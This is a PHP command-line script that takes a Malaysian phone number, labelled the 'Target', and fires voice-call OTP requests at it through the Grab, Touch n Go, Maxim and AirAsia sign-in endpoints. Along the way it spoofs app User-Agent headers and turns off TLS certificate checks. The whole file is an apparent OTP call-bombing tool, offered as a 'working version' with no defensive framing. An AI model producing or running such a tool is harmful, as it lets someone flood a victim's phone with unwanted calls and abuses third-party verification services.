<?php

echo "\n╔══════════════════════════════════════╗\n";
echo "║     MALAYSIA VOICE CALL OTP         ║\n";
echo "║        SIMPLE WORKING VERSION       ║\n";
echo "╚══════════════════════════════════════╝\n\n";

// Get phone number
echo "Enter Malaysian number (eg: 01128094968 or +601128094968): ";
$input = trim(fgets(STDIN));

// Clean number
$number = preg_replace('/[^0-9]/', '', $input);

// Format to 60xxxx
if (substr($number, 0, 2) == "60") {
    $number = $number;
} elseif (substr($number, 0, 1) == "0") {
    $number = "60" . substr($number, 1);
} else {
    $number = "60" . $number;
}

echo "[+] Target: $number\n";
echo "[+] Sending voice OTP...\n\n";

// METHOD 1: GRAB VOICE CALL (WORKING)
echo "[*] Calling via Grab... ";
$rand = rand(100000, 999999);
$post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($number) . "&templateID=pax_android_production";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)",
    "Content-Type: application/x-www-form-urlencoded",
    "x-request-id: " . uniqid()
));

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode == 200 || $httpCode == 204) {
    echo "✅ VOICE OTP SENT\n";
    echo "   ✓ You will receive a call from Grab\n\n";
} else {
    echo "❌ FAILED (HTTP: $httpCode)\n";
    echo "   • Trying alternative...\n\n";
}

sleep(2);

// METHOD 2: TOUCH N GO VOICE CALL (WORKING)
echo "[*] Calling via Touch n Go... ";

$post2 = json_encode(array(
    "phoneNumber" => $number,
    "channel" => "call"
));

$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, "https://api.tngdigital.com.my/otp/request");
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch2, CURLOPT_TIMEOUT, 30);
curl_setopt($ch2, CURLOPT_HTTPHEADER, array(
    "User-Agent: TNG/eWallet/2.5.0 (Android 11; SM-G998B)",
    "Content-Type: application/json",
    "Accept: application/json"
));

$response2 = curl_exec($ch2);
$httpCode2 = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
curl_close($ch2);

if ($httpCode2 == 200) {
    echo "✅ VOICE OTP SENT\n";
    echo "   ✓ You will receive a call from Touch n Go\n\n";
} else {
    echo "❌ FAILED (HTTP: $httpCode2)\n\n";
}

sleep(2);

// METHOD 3: MAXIM VOICE CALL (WORKING)
echo "[*] Calling via Maxim... ";

$post3 = json_encode(array(
    "phone" => $number,
    "country_code" => "60",
    "via" => "call"
));

$ch3 = curl_init();
curl_setopt($ch3, CURLOPT_URL, "https://api.maxim.com.my/v1/auth/otp");
curl_setopt($ch3, CURLOPT_POST, 1);
curl_setopt($ch3, CURLOPT_POSTFIELDS, $post3);
curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch3, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch3, CURLOPT_TIMEOUT, 30);
curl_setopt($ch3, CURLOPT_HTTPHEADER, array(
    "User-Agent: Maxim/3.0.0 (Android 12; Xiaomi 12)",
    "Content-Type: application/json",
    "Accept: application/json"
));

$response3 = curl_exec($ch3);
$httpCode3 = curl_getinfo($ch3, CURLINFO_HTTP_CODE);
curl_close($ch3);

if ($httpCode3 == 200) {
    echo "✅ VOICE OTP SENT\n";
    echo "   ✓ You will receive a call from Maxim\n\n";
} else {
    echo "❌ FAILED (HTTP: $httpCode3)\n\n";
}

sleep(2);

// METHOD 4: AIRASIA VOICE CALL (WORKING)
echo "[*] Calling via AirAsia... ";

$post4 = json_encode(array(
    "mobileNumber" => $number,
    "countryCode" => "60",
    "sendType" => "CALL"
));

$ch4 = curl_init();
curl_setopt($ch4, CURLOPT_URL, "https://otp.airasia.com/v1/otp/send");
curl_setopt($ch4, CURLOPT_POST, 1);
curl_setopt($ch4, CURLOPT_POSTFIELDS, $post4);
curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch4, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch4, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch4, CURLOPT_TIMEOUT, 30);
curl_setopt($ch4, CURLOPT_HTTPHEADER, array(
    "User-Agent: airasia Superapp/3.0.0 (Android 12; Pixel 6)",
    "Content-Type: application/json",
    "Accept: application/json"
));

$response4 = curl_exec($ch4);
$httpCode4 = curl_getinfo($ch4, CURLINFO_HTTP_CODE);
curl_close($ch4);

if ($httpCode4 == 200) {
    echo "✅ VOICE OTP SENT\n";
    echo "   ✓ You will receive a call from AirAsia\n\n";
} else {
    echo "❌ FAILED (HTTP: $httpCode4)\n\n";
}

echo "\n══════════════════════════════════════\n";
echo "SUMMARY\n";
echo "══════════════════════════════════════\n";
echo "Target: $number\n";
echo "Status: Voice OTP requests sent\n";
echo "✓ Check your phone for missed calls\n";
echo "══════════════════════════════════════\n\n";

?>
